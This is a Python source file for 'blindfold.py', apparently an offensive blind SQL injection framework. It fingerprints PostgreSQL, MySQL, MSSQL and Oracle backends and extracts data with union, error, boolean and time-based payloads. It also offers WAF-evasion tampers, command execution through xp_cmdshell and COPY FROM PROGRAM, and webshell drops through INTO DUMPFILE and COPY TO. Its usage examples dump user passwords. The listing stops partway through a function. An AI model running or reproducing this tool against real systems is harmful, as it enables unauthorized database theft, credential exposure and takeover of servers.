#!/usr/bin/env python3
"""
blindfold.py - Structured, multi-DBMS blind SQL injection extractor (formerly pg-time-blind).

Despite the historical name, this tool now handles several DBMS and three blind
techniques, choosing automatically:

  PHASE 1 - DETECTION
    1. CONTEXT     : finds where/how the injection breaks out
                     (string vs numeric, AND / OR, stacked).
    2. DBMS        : fingerprints the backend automatically
                     (PostgreSQL, MySQL, MSSQL, Oracle).
    3. TECHNIQUE   : picks the fastest available, preferring
                       union-based  (reflected, ~1 request/value)
                     > error-based  (one-shot dump via a forced DB error)
                     > boolean-based (auto-calibrated TRUE/FALSE signal)
                     > time-based    (sleep oracle, last resort).
  Optional WAF evasion via --tamper (space2comment, randomcase, charencode).

  PHASE 2 - EXTRACTION
    - error-based : leaks the whole value in ONE request (chunked if the DBMS
                    truncates error text, e.g. MySQL extractvalue ~32 chars).
    - boolean/time: per-character binary search (~7 requests/char). Boolean
                    extraction can run concurrently with --threads.

SAFETY
  OR-based contexts can change application state (e.g. 'foo' OR 1=1 may match all
  rows / log you in). They are DISABLED by default; pass --allow-or to include them.

RESUME / MEMORY
  Progress + the detected DBMS/technique/context are checkpointed to a JSON state
  file after each character. Re-run the SAME command to auto-resume. --fresh to
  ignore it, --state PATH to choose the file. Deleted automatically on success.

No sqlmap. Only `requests` is required.

----------------------------------------------------------------------
EXAMPLES
  # DEFAULT: just map the DB (DBMS + current database + table list)
  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test"

  # dump a specific table (columns auto-discovered; rows capped by --max-rows)
  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" \
      --dump users

  # power mode: extract one specific scalar
  python3 blindfold.py -u http://t:3000/login \
      -d "username=INJECT&password=test" \
      --query "SELECT password FROM users WHERE username='antwon'"

  # reuse a Burp request, force MySQL, allow risky OR contexts
  python3 blindfold.py --request req.txt --dbms mysql --allow-or \
      --query "SELECT current_user()"

  # speed up boolean extraction with 8 workers
  python3 blindfold.py -u "http://t/item?id=INJECT" --threads 8 \
      --query "SELECT version()"
----------------------------------------------------------------------
"""
import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading, random, difflib
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3

DELIM = "QxZx"                      # marker wrapped around error-based leaks
PROBE = "Prb0"                     # constant used to detect error reflection
TRUE_COND, FALSE_COND = "1=1", "1=2"
RCE_SHELL = "\x00rce-shell"        # sentinel: --rce with no command -> interactive shell
RCE_TABLE = "bf_rce"              # scratch table that captures command output
UMARK = "bfUc"                   # UNION column-reflection probe
ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value

VERSION = "3.6.6"
_RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
_ART = r"""
 ____  _      _____ _   _ _____  ______ ____  _      _____
|  _ \| |    |_   _| \ | |  __ \|  ____/ __ \| |    |  __ \
| |_) | |      | | |  \| | |  | | |__ | |  | | |    | |  | |
|  _ <| |      | | | . ` | |  | |  __|| |  | | |    | |  | |
| |_) | |____ _| |_| |\  | |__| | |   | |__| | |____| |__| |
|____/|______|_____|_| \_|_____/|_|    \____/|______|_____/
"""
_W = max(len(l) for l in _ART.splitlines())          # banner width
_SUB = "created by Hassan Almatar".center(_W)         # name centered under it
_TAG = ("blind SQLi framework  -  v%s" % VERSION).center(_W)
BANNER = _RED + _ART + _SUB + "\n" + _TAG + _RESET


class RequestError(Exception):
    """An HTTP request ultimately failed (after transport retries). Catchable so
    extraction can checkpoint and exit cleanly instead of crashing the process."""


# ===========================================================================
# DBMS adapters - each knows its own SQL dialect.
# ===========================================================================
class Dbms:
    name = "generic"
    comment = "-- -"               # works for PG / MySQL / MSSQL / Oracle
    fingerprints = []              # boolean conditions TRUE only on this DBMS
    stacked = False                # supports ; stacked queries
    error_trunc = None            # max chars an error reflects (None = unlimited)

    # --- per-character primitives (override per DBMS) ---
    def length(self, e):  return f"length(({e}))"
    def substr(self, e, p): return f"substr(({e}),{p},1)"
    def asc(self, ch):    return f"ascii({ch})"
    def code_expr(self, ch): return f"ascii({ch})"   # Unicode code point of one char

    # --- safe quoting ---
    def quote_str(self, s):              # string literal
        return "'" + s.replace("'", "''") + "'"
    def quote_ident(self, name):         # identifier (table/column)
        return '"' + name.replace('"', '""') + '"'

    # --- time-based payload fragments (return None if unsupported) ---
    def sleep_inline(self, cond, sleep): return None   # used after AND/OR
    def sleep_stacked(self, cond, sleep): return None  # used after ';'

    # --- error-based: SQL fragment (after AND/OR) that errors out leaking value
    error_hex = False                 # True if the leaked token is hex (decode at the end)
    def error_expr(self, inner): return None
    def error_expr_forced(self, inner): return self.error_expr(inner)  # force a non-numeric cast fail
    def error_value(self, text):
        m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
        return m.group(1) if m else None
    def error_finalize(self, token):  # raw reflected token -> real value
        return token

    # --- RCE. Two independent capabilities: command exec (needs stacked queries) and
    #     webshell file-drop (needs file-write privilege). Either may be unsupported. ---
    can_exec = False                  # COPY FROM PROGRAM / xp_cmdshell style command exec
    can_webshell = False              # file write (INTO DUMPFILE / COPY TO)
    def rce_setup(self): return []        # one-time enable statements (stacked)
    def rce_exec(self, cmd): return []    # statements that run cmd, capturing output to RCE_TABLE
    def rce_read(self): return None       # SELECT returning the captured output (read via oracle)
    def rce_cleanup(self): return []      # tidy-up statements (stacked)
    def webshell_write(self, path, content): return None   # statement that writes the file
    def file_check(self, path, marker):    # scalar query: 'OK' if file exists and contains marker
        return None

    # --- UNION-based (reflected) extraction ---
    union_from = ""                   # extra FROM a UNION SELECT needs (Oracle: " FROM dual")
    def union_wrap(self, qexpr, left, right):     # wrap a scalar: left || value || right
        return f"'{left}'||({qexpr})||'{right}'"
    def concat_parts(self, parts):                # concat string literals in this dialect
        return "||".join(f"'{p}'" for p in parts)

    # --- schema mapping queries (override per DBMS) ---
    list_sep = ","
    row_sep = "|"
    def q_current_db(self): return "SELECT current_database()"
    def q_tables(self):
        return ("SELECT string_agg(table_name,',') FROM information_schema.tables "
                "WHERE table_schema=current_schema()")
    def q_columns(self, t):
        return (f"SELECT string_agg(column_name,',') FROM information_schema.columns "
                f"WHERE table_name={self.quote_str(t)}")
    def q_count(self, t): return f"SELECT cast(count(*) as text) FROM {self.quote_ident(t)}"
    def concat_cols(self, cols):
        return " || '|' || ".join(f"coalesce(cast({self.quote_ident(c)} as text),'')" for c in cols)
    def q_row(self, t, cols, off):
        return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT 1 OFFSET {off}"


class Postgres(Dbms):
    name = "postgresql"
    stacked = True
    fingerprints = ["(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"]
    def sleep_inline(self, cond, sleep):
        return f"(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1"
    def sleep_stacked(self, cond, sleep):
        return f"SELECT pg_sleep({sleep}) WHERE {cond}"
    def error_expr(self, inner):
        # PG '::int' is shorter than CAST(.. AS int): a non-numeric value fails the cast and
        # the error quotes it. The leaner the payload, the better it survives a length cap.
        return f"({inner})::int=1"
    def error_expr_forced(self, inner):
        # a purely numeric value casts cleanly (no error); '~' forces the failure.
        return f"('~'||({inner}))::int=1"
    def error_value(self, text):
        # read the value from the integer-cast error itself. Anchoring to that message
        # (not a bare delimiter) means a query echoed back in the page can't fool us.
        m = re.search(r'invalid input syntax for (?:type )?integer:\s*"~?(.*?)"', text)
        return m.group(1) if m else None
    def q_tables(self):
        # pg_stat_user_tables lists ONLY user tables (no system noise) and is far shorter than
        # the information_schema query, so it fits moderate length caps in a single request.
        return "SELECT string_agg(relname,',') FROM pg_stat_user_tables"
    # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
    can_exec = True
    can_webshell = True
    def rce_exec(self, cmd):
        return [f"DROP TABLE IF EXISTS {RCE_TABLE}",
                f"CREATE TABLE {RCE_TABLE}(o text)",
                f"COPY {RCE_TABLE} FROM PROGRAM {self.quote_str(cmd)}"]
    def rce_read(self):
        return f"SELECT string_agg(o, chr(10)) FROM {RCE_TABLE}"
    def rce_cleanup(self):
        return [f"DROP TABLE IF EXISTS {RCE_TABLE}"]
    def webshell_write(self, path, content):
        return f"COPY (SELECT {self.quote_str(content)}) TO {self.quote_str(path)}"
    def file_check(self, path, marker):
        return (f"SELECT CASE WHEN position({self.quote_str(marker)} in "
                f"pg_read_file({self.quote_str(path)}))>0 THEN 'OK' ELSE 'NO' END")


class MySQL(Dbms):
    name = "mysql"
    stacked = False
    # value is HEX-encoded so quotes/specials/multibyte survive; ~14 chars/chunk keeps
    # the hex (~28) + marker within extractvalue's ~32-char reflection limit.
    error_trunc = 14
    error_hex = True
    fingerprints = ["CONNECTION_ID()>0"]
    def substr(self, e, p): return f"substring(({e}),{p},1)"
    def sleep_inline(self, cond, sleep):
        return f"IF(({cond}),SLEEP({sleep}),0)=0"
    def error_expr(self, inner):
        return f"extractvalue(1,concat(0x7e,hex(({inner}))))"
    def error_value(self, text):
        m = re.search(r"~([0-9A-Fa-f]+)", text)
        return m.group(1) if m else None
    def error_finalize(self, token):
        if not token:
            return token
        token = token[:len(token) // 2 * 2]            # drop any half-byte from truncation
        try:
            return bytes.fromhex(token).decode("utf-8", "replace")
        except ValueError:
            return token
    # RCE: no stacked command exec; webshell via INTO DUMPFILE (raw, hex-encoded payload).
    # Needs FILE priv + a permissive secure_file_priv. Verify/read-back via LOAD_FILE.
    can_webshell = True
    def webshell_write(self, path, content):
        return f"SELECT 0x{content.encode().hex()} INTO DUMPFILE {self.quote_str(path)}"
    def file_check(self, path, marker):
        like = self.quote_str("%" + marker + "%")
        return (f"SELECT CASE WHEN LOAD_FILE({self.quote_str(path)}) LIKE {like} "
                f"THEN 'OK' ELSE 'NO' END")
    def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
    def union_wrap(self, qexpr, left, right):
        return f"concat('{left}',({qexpr}),'{right}')"
    def concat_parts(self, parts):
        return "concat(" + ",".join(f"'{p}'" for p in parts) + ")"
    def q_count(self, t): return f"SELECT cast(count(*) as char) FROM {self.quote_ident(t)}"
    def q_current_db(self): return "SELECT database()"
    def q_tables(self):
        return ("SELECT group_concat(table_name) FROM information_schema.tables "
                "WHERE table_schema=database()")
    def q_columns(self, t):
        return (f"SELECT group_concat(column_name) FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name={self.quote_str(t)}")
    def concat_cols(self, cols):
        return "concat_ws('|'," + ",".join(self.quote_ident(c) for c in cols) + ")"
    def q_row(self, t, cols, off):
        return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT {off},1"


class MSSQL(Dbms):
    name = "mssql"
    stacked = True
    fingerprints = ["@@version LIKE 'Microsoft%'"]
    def length(self, e):  return f"len(({e}))"
    def substr(self, e, p): return f"substring(({e}),{p},1)"
    def code_expr(self, ch): return f"unicode({ch})"   # UTF-16 code unit
    def quote_ident(self, name): return "[" + name.replace("]", "]]") + "]"
    def union_wrap(self, qexpr, left, right):
        return f"'{left}'+CAST(({qexpr}) AS varchar(8000))+'{right}'"
    def concat_parts(self, parts):
        return "+".join(f"'{p}'" for p in parts)
    def sleep_stacked(self, cond, sleep):
        return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
    def error_expr(self, inner):
        return f"1=CAST(({inner}) AS int)"
    def error_expr_forced(self, inner):
        return f"1=CAST(('~'+CAST(({inner}) AS varchar(8000))) AS int)"
    def error_value(self, text):
        m = re.search(r"converting the (?:var|n?var|n)?char value '~?(.*?)'", text)
        return m.group(1) if m else None
    # RCE: enable + xp_cmdshell (sysadmin). Output captured into a table, read via oracle.
    can_exec = True
    def rce_setup(self):
        return ["EXEC sp_configure 'show advanced options',1", "RECONFIGURE",
                "EXEC sp_configure 'xp_cmdshell',1", "RECONFIGURE"]
    def rce_exec(self, cmd):
        return [f"IF OBJECT_ID('{RCE_TABLE}') IS NOT NULL DROP TABLE {RCE_TABLE}",
                f"CREATE TABLE {RCE_TABLE}(l nvarchar(max) NULL)",
                f"INSERT {RCE_TABLE} EXEC master..xp_cmdshell {self.quote_str(cmd)}"]
    def rce_read(self):
        return f"SELECT STRING_AGG(l,CHAR(10)) FROM {RCE_TABLE} WHERE l IS NOT NULL"
    def rce_cleanup(self):
        return [f"IF OBJECT_ID('{RCE_TABLE}') IS NOT NULL DROP TABLE {RCE_TABLE}"]
    def q_count(self, t): return f"SELECT cast(count(*) as varchar(32)) FROM {self.quote_ident(t)}"
    def q_current_db(self): return "SELECT DB_NAME()"
    def q_tables(self):
        return ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
                "WHERE table_type='BASE TABLE'")
    def q_columns(self, t):
        return (f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns "
                f"WHERE table_name={self.quote_str(t)}")
    def concat_cols(self, cols):
        return "concat(" + ",'|',".join(f"cast({self.quote_ident(c)} as nvarchar(4000))" for c in cols) + ")"
    def q_row(self, t, cols, off):
        return (f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} "
                f"ORDER BY (SELECT NULL) OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY")


class Oracle(Dbms):
    name = "oracle"
    stacked = False
    fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
    # boolean works great; time/error left None (handled via boolean fallback)
    union_from = " FROM dual"         # Oracle UNION SELECT needs a FROM
    def quote_ident(self, name):
        # Oracle folds unquoted idents to upper; keep them bare but whitelist to avoid injection
        if not re.match(r"^[A-Za-z0-9_$#]+$", name):
            raise SystemExit(f"[!] refusing unsafe Oracle identifier: {name!r}")
        return name
    def q_count(self, t): return f"SELECT to_char(count(*)) FROM {self.quote_ident(t)}"
    def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
    def q_tables(self):
        return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
    def q_columns(self, t):
        return (f"SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) "
                f"FROM user_tab_columns WHERE table_name={self.quote_str(t.upper())}")
    def concat_cols(self, cols):
        return " || '|' || ".join(f"to_char({self.quote_ident(c)})" for c in cols)
    def q_row(self, t, cols, off):
        return (f"SELECT {self.concat_cols(cols)} FROM "
                f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {self.quote_ident(t)} ORDER BY 1) a "
                f"WHERE ROWNUM <= {off+1}) WHERE rn = {off+1}")


DBMS_LIST = [Postgres(), MySQL(), MSSQL(), Oracle()]
DBMS_BY_NAME = {d.name: d for d in DBMS_LIST}


# ===========================================================================
# Injection contexts
# ===========================================================================
class Ctx:
    def __init__(self, name, close, logic, kind):
        self.name, self.close, self.logic, self.kind = name, close, logic, kind

# kind: "bool" contexts also serve error-based; "stacked" only for time
BOOL_CONTEXTS = [
    Ctx("string-and", "'", " AND ", "bool"),
    Ctx("numeric-and", "", " AND ", "bool"),
    Ctx("string-or",  "'", " OR ", "bool"),
    Ctx("numeric-or", "", " OR ", "bool"),
]
STACKED_CONTEXT = Ctx("stacked", "'", "", "stacked")


def boolean_payload(ctx, cond, comment):
    return f"{ctx.close}{ctx.logic}({cond}){comment}"


# ===========================================================================
# WAF tamper layer. Tampers transform the payload BEFORE URL-encoding. The
# string ones are quote-aware: they never touch text inside '...' literals, so
# our markers / webshells / identifiers stay intact. 'charencode' is handled in
# the encoder (it replaces URL-encoding with full %XX).
# ===========================================================================
def _apply_outside_quotes(s, fn):
    out, seg, in_q, i = [], [], False, 0
    while i < len(s):
        ch = s[i]
        if ch == "'" and in_q and i + 1 < len(s) and s[i + 1] == "'":
            out.append("''"); i += 2; continue       # escaped quote inside a literal
        if ch == "'":
            if not in_q:
                out.append(fn("".join(seg))); seg = []
            out.append("'"); in_q = not in_q; i += 1; continue
        if in_q:
            out.append(ch)
        else:
            seg.append(ch)
        i += 1
    out.append(fn("".join(seg)))
    return "".join(out)

def _t_space2comment(s):
    return _apply_outside_quotes(s, lambda seg: seg.replace(" ", "/**/"))

def _t_randomcase(s):
    flip = lambda seg: "".join(random.choice((c.upper, c.lower))() if c.isalpha() else c for c in seg)
    return _apply_outside_quotes(s, flip)

STRING_TAMPERS = {"space2comment": _t_space2comment, "randomcase": _t_randomcase}
ALL_TAMPERS = set(STRING_TAMPERS) | {"charencode"}


# ===========================================================================
# HTTP transport
# ===========================================================================
def parse_request_file(path, proto):
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        raw = fh.read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    parts = lines[0].split()
    if len(parts) < 2:
        raise SystemExit(f"[!] malformed request line in {path!r}: {lines[0]!r}")
    method, target = parts[0], parts[1]
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip()] = v.strip()
    host = headers.get("Host", "")
    if target.startswith("http"):
        url, scheme_known = target, True
    elif proto:                                  # scheme forced via --proto
        url, scheme_known = f"{proto}://{host}{target}", True
    else:                                        # no scheme anywhere -> probe later (https first)
        url, scheme_known = f"https://{host}{target}", False
    return method, url, headers, body.rstrip("\n"), scheme_known


class Resp:
    __slots__ = ("status", "text", "length", "elapsed")
    def __init__(self, status, text, elapsed):
        self.status, self.text, self.length, self.elapsed = status, text, len(text), elapsed


class Target:
    def __init__(self, a):
        self.a = a
        self.count = 0
        self._lock = threading.Lock()
        if a.request:
            (self.method, self.url, self.headers, self.data,
             self._scheme_known) = parse_request_file(a.request, a.proto)
        else:
            self.url, self.data, self.headers, self._scheme_known = a.url, a.data, {}, True
            for h in (a.header or []):
                if ":" not in h:
                    raise SystemExit(f"[!] bad header (expected 'Name: value'): {h!r}")
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
            self.method = (a.method or ("POST" if a.data else "GET")).upper()
        self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None
        if a.proxy and a.proxy.startswith("socks"):
            try:
                import socks  # noqa: F401  (PySocks, pulled in by requests[socks])
            except ImportError:
                raise SystemExit("[!] SOCKS proxy needs PySocks: pip install requests[socks]")
        self.verify = not getattr(a, "insecure", False)
        if not self.verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        # sanitize replayed headers: force plaintext responses (so matching works) and
        # drop hop-by-hop headers that make some servers 400 a replayed browser request
        _drop = {"accept-encoding", "connection", "te", "content-length"}
        self.headers = {k: v for k, v in self.headers.items() if k.lower() not in _drop}
        self.headers["Accept-Encoding"] = "identity"
        # the injection marker must actually appear somewhere we can substitute into
        blob = (self.url or "") + (self.data or "") + "".join(self.headers.values())
        if a.marker not in blob:
            raise SystemExit(f"[!] marker {a.marker!r} not found in the request — place it at the "
                             f"injection point (e.g. TrackingId=abc{a.marker} in the cookie).")
        # the run of value chars right before the marker (e.g. a tracking-id) is deletable:
        # dropping it frees length budget on a capped point without affecting the injection
        # (the breakout quote ignores whatever string content preceded it).
        _f = next((s for s in [self.url or "", self.data or ""] + list(self.headers.values())
                   if a.marker in s), "")
        _m = re.search(r"([^=&;,\"'/?\s]*)" + re.escape(a.marker), _f)
        self.marker_prefix = _m.group(1) if _m else ""
        self.trim_prefix = False
        self._trim_announced = False
        self.session = requests.Session()    # keep-alive + cookie persistence
        self._baseline = None
        names = [t.strip() for t in (getattr(a, "tamper", None) or "").split(",") if t.strip()]
        self._tampers = [STRING_TAMPERS[n] for n in names if n in STRING_TAMPERS]
        self._charencode = "charencode" in names

    def baseline(self, a):
        """Median + stdev of normal (no-sleep) response latency, sampled once."""
        if self._baseline is None:
            xs = sorted(self.send("").elapsed for _ in range(max(3, a.cal_samples)))
            med = xs[len(xs) // 2]
            mean = sum(xs) / len(xs)
            sd = (sum((x - mean) ** 2 for x in xs) / len(xs)) ** 0.5
            self._baseline = (med, sd)
        return self._baseline

    def autodetect_scheme(self):
        """A --request file carries no URL scheme. If none was forced with --proto,
        try HTTPS first and fall back to HTTP only if the TLS endpoint is unreachable
        (modern targets, and all PortSwigger labs, are HTTPS - plain HTTP to them was
        silently 400ing every payload and looking like 'no injection')."""
        if self._scheme_known or not self.url.startswith("https://"):
            return
        try:
            self.send("")                             # clean baseline over https
        except RequestError:
            self.url = "http://" + self.url[len("https://"):]
            print("[*] https unreachable - falling back to http")
        self._scheme_known = True

    def _transform(self, p):
        for fn in self._tampers:                      # quote-aware SQL tampers
            p = fn(p)
        if self._charencode:                          # full %XX encoding (WAF bypass)
            return "".join("%%%02X" % b for b in p.encode())
        return urllib.parse.quote_plus(p) if self.a.encode else p

    def _put(self, s, payload):
        if not s:
            return s
        if self.trim_prefix and self.marker_prefix:
            cut = self.marker_prefix + self.a.marker        # drop the deletable prefix too
            if cut in s:
                return s.replace(cut, payload)
        return s.replace(self.a.marker, payload)

    def _announce_trim(self):
        if not self._trim_announced:
            self._trim_announced = True
            print(f"[*] length cap suspected — dropped the {len(self.marker_prefix)}-char "
                  f"injection prefix to free room (its value isn't needed for the injection)")

    def send(self, payload):
        d = getattr(self.a, "delay", 0.0)          # pace requests (avoid rate-limit / 504 tar-pit)
        if d:
            j = getattr(self.a, "jitter", 0.0)
            time.sleep(d + (random.random() * j if j else 0.0))
        payload = self._transform(payload)
        url = self._put(self.url, payload)
        data = self._put(self.data, payload)
        headers = {k: self._put(v, payload) for k, v in self.headers.items()}
        headers.pop("Content-Length", None)
        if data and not any(k.lower() == "content-type" for k in headers):
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        attempts = getattr(self.a, "net_retries", 2) + 1
        for attempt in range(attempts):
            with self._lock:
                self.count += 1
            start = time.time()
            # network timeout is its own concern, but must clear a time-based sleep
            tmo = max(getattr(self.a, "timeout", 30), self.a.sleep + 10)
            try:
                r = self.session.request(self.method, url, data=data, headers=headers,
                                         proxies=self.proxies, verify=self.verify,
                                         timeout=tmo, allow_redirects=False)
                return Resp(r.status_code, r.text or "", time.time() - start)
            except requests.exceptions.RequestException as e:
                if attempt < attempts - 1:
                    time.sleep(0.4 * (attempt + 1))     # brief backoff, then retry
                    continue
                raise RequestError(
                    f"request failed after {attempts} attempts: {e}\n"
                    "    (progress is checkpointed - re-run the same command to resume)")


# ===========================================================================
# Oracles - answer "is this SQL condition TRUE?"  (boolean & time)
# ===========================================================================
class Oracle_:
    def __init__(self, target, dbms, ctx, a):
        self.t, self.dbms, self.ctx, self.a = target, dbms, ctx, a
        self.kind = "?"

    def fires(self, cond): raise NotImplementedError

    def char(self, query, pos):
        code = self.dbms.code_expr(self.dbms.substr(query, pos))
        # fast path: known alphabet (e.g. --charset hex) -> binary-search within it only
        cs = getattr(self.a, "charset", None)
        if cs:
            lo, hi = 0, len(cs) - 1
            while lo < hi:
                mid = (lo + hi) // 2
                if self.fires(f"{code}>{ord(cs[mid])}"):
                    lo = mid + 1
                else:
                    hi = mid
            return cs[lo]
        # general path: binary-search the Unicode code point; ASCII stays in the fast 0-127
        # band, non-ASCII auto-extends (unless --ascii) so UTF-8 data isn't silently corrupted.
        lo, hi = 0, 127
        if not getattr(self.a, "ascii_only", False) and self.fires(f"{code}>127"):
            lo, hi = 128, 255                         # we know it's non-ASCII; raise the floor
            cap = self.a.max_codepoint
            while hi < cap and self.fires(f"{code}>{hi}"):
                hi = min(hi * 2, cap)         # gentle growth: less overshoot before binary search
        while lo < hi:
            mid = (lo + hi) // 2
            if self.fires(f"{code}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        try:
            return chr(lo)
        except ValueError:
            return "�"

    def char_confirmed(self, query, pos, tries=2):
        """Extract a char and verify it with an equality check; redo on disagreement.
        Cheap insurance against a single flipped response (esp. under --threads)."""
        code = self.dbms.code_expr(self.dbms.substr(query, pos))
        last = ""
        for _ in range(tries + 1):
            last = self.char(query, pos)
            if self.fires(f"{code}={ord(last)}"):
                return last
        return last


class BoolOracle(Oracle_):
    def __init__(self, target, dbms, ctx, a, classifier, signal):
        super().__init__(target, dbms, ctx, a)
        self.kind = "boolean-based"
        self.classify = classifier
        self.signal = signal
    def fires(self, cond):
        p = boolean_payload(self.ctx, cond, self.dbms.comment)
        return self.classify(self.t.send(p))


class TimeOracle(Oracle_):
    def __init__(self, target, dbms, ctx, a):
        super().__init__(target, dbms, ctx, a)
        self.kind = "time-based"
        if a.threshold:                       # explicit absolute override
            self.thresh = a.threshold
        else:                                 # adaptive: baseline latency + margin
            med, sd = target.baseline(a)
            margin = max(a.sleep * 0.5, sd * 3)
            self.thresh = min(med + margin, med + a.sleep * 0.85)
    def _payload(self, cond):
        if self.ctx.kind == "stacked":
            return f"{self.ctx.close};{self.dbms.sleep_stacked(cond, self.a.sleep)}{self.dbms.comment}"
        return f"{self.ctx.close}{self.ctx.logic}{self.dbms.sleep_inline(cond, self.a.sleep)}{self.dbms.comment}"
    def fires(self, cond):
        # majority vote over (retries+1) samples — robust to jitter in either direction
        n = self.a.retries + 1
        slow = sum(self.t.send(self._payload(cond)).elapsed >= self.thresh for _ in range(n))
        return slow * 2 > n
    def confirmed(self):
        """Detection gate: a REAL time-based injection makes the TRUE payload take ~sleep
        longer than the FALSE payload of the same shape. Compare them directly (relative, not
        an absolute baseline) and require a clear, repeated gap — so overall server slowdown
        cancels out and a one-off jitter spike can't fake a hit. Same request budget as before."""
        gap = self.a.sleep * 0.6
        f0 = self.t.send(self._payload(FALSE_COND)).elapsed
        t0 = self.t.send(self._payload(TRUE_COND)).elapsed
        if t0 - f0 < gap:                 # no conditional delay -> reject early (2 requests)
            return False
        f1 = self.t.send(self._payload(FALSE_COND)).elapsed
        t1 = self.t.send(self._payload(TRUE_COND)).elapsed
        return (min(t0, t1) - max(f0, f1)) >= gap     # both TRUEs must beat both FALSEs by the gap


# ===========================================================================
# Calibration (auto TRUE/FALSE signal for boolean)
# ===========================================================================
def _norm_tokens(text):
    # drop digit-only tokens so timestamps/counters don't poison token matching
    return {w for w in re.sub(r"\d+", "#", text).split() if len(w) >= 3}

def _lines(txt):
    return {ln.strip() for ln in txt.splitlines() if len(ln.strip()) >= 4}

def _ratio(x, y):
    return difflib.SequenceMatcher(None, x, y).quick_ratio()

def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
    vb = getattr(a, "verbose", False)
    # user-supplied matcher: still VERIFY it actually distinguishes true vs false in
    # THIS context (otherwise we'd "detect" an injection that isn't really there).
    if a.true_match or a.false_match:
        if a.true_match:
            clf, desc = (lambda r: a.true_match in r.text), f"text~'{a.true_match}'"
        else:
            clf, desc = (lambda r: a.false_match not in r.text), f"!text~'{a.false_match}'"
        rt = target.send(boolean_payload(ctx, cond_true, "-- -"))
        rf = target.send(boolean_payload(ctx, cond_false, "-- -"))
        if vb:
            print(f"    [v] {ctx.name} match-probe: true={clf(rt)} false={clf(rf)} "
                  f"(status {rt.status}/{rf.status}, len {rt.length}/{rf.length})")
        return (clf, desc) if (clf(rt) and not clf(rf)) else None

    T = [target.send(boolean_payload(ctx, cond_true, "-- -")) for _ in range(3)]
    F = [target.send(boolean_payload(ctx, cond_false, "-- -")) for _ in range(3)]
    if vb:
        print(f"    [v] {ctx.name} status t={[r.status for r in T]} f={[r.status for r in F]}")
        print(f"    [v] {ctx.name} length t={[r.length for r in T]} f={[r.length for r in F]}")

    # 1) status code
    st_t, st_f = {r.status for r in T}, {r.status for r in F}
    if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
        good = st_t.pop()
        return (lambda r, s=good: r.status == s), f"status=={good}"

    # 2) body length — by RANGE separation (robust to small jitter, no strict stability)
    lt, lf = [r.length for r in T], [r.length for r in F]
    if max(lf) + a.len_margin <= min(lt):
        b = (max(lf) + min(lt)) / 2
        return (lambda r, m=b: r.length > m), f"len>{int(b)}"
    if max(lt) + a.len_margin <= min(lf):
        b = (max(lt) + min(lf)) / 2
        return (lambda r, m=b: r.length < m), f"len<{int(b)}"

    # 3) digit-stripped TOKEN unique to TRUE (or FALSE)
    tt = [_norm_tokens(r.text) for r in T]
    tf = [_norm_tokens(r.text) for r in F]
    only_t = set.intersection(*tt) - set.union(*tf)
    for tok in sorted(only_t, key=len, reverse=True):
        return (lambda r, k=tok: k in re.sub(r"\d+", "#", r.text)), f"text~'{tok}'"
    only_f = set.intersection(*tf) - set.union(*tt)
    for tok in sorted(only_f, key=len, reverse=True):
        return (lambda r, k=tok: k not in re.sub(r"\d+", "#", r.text)), f"!text~'{tok}'"

    # 4) distinguishing LINE/phrase unique to TRUE (catches multi-word markers like
    #    "Welcome back" when no single word is unique)
    Lt = set.intersection(*[_lines(r.text) for r in T])
    Lf = set().union(*[_lines(r.text) for r in F])
    for ln in sorted(Lt - Lf, key=len, reverse=True):
        if vb: print(f"    [v] line discriminator: {ln[:60]!r}")
        return (lambda r, k=ln: k in r.text), f"line~'{ln[:25]}'"

    # 5) last resort: response SIMILARITY (content differs but no clean substring)
    reft, reff = T[0].text, F[0].text
    self_t, cross = _ratio(reft, T[1].text), _ratio(reft, reff)
    if vb: print(f"    [v] similarity self_t={self_t:.3f} cross={cross:.3f}")
    if self_t >= 0.90 and self_t - cross >= 0.01:
        return ((lambda r, a=reft, b=reff: _ratio(r.text, a) >= _ratio(r.text, b)),
                f"similarity~{self_t:.2f}/{cross:.2f}")
    if vb: print(f"    [v] {ctx.name}: no usable discriminator")
    return None


# ===========================================================================
# Detection
# ===========================================================================
def find_boolean(target, a, contexts):
    for ctx in contexts:
        print(f"[*] boolean probe : {ctx.name} ...", flush=True)
        cal = calibrate(target, ctx, a)
        if cal:
            print(f"[+] boolean signal on {ctx.name}: {cal[1]}")
            return ctx, cal
    return None, None

def fingerprint_dbms(target, ctx, classifier, a, candidates):
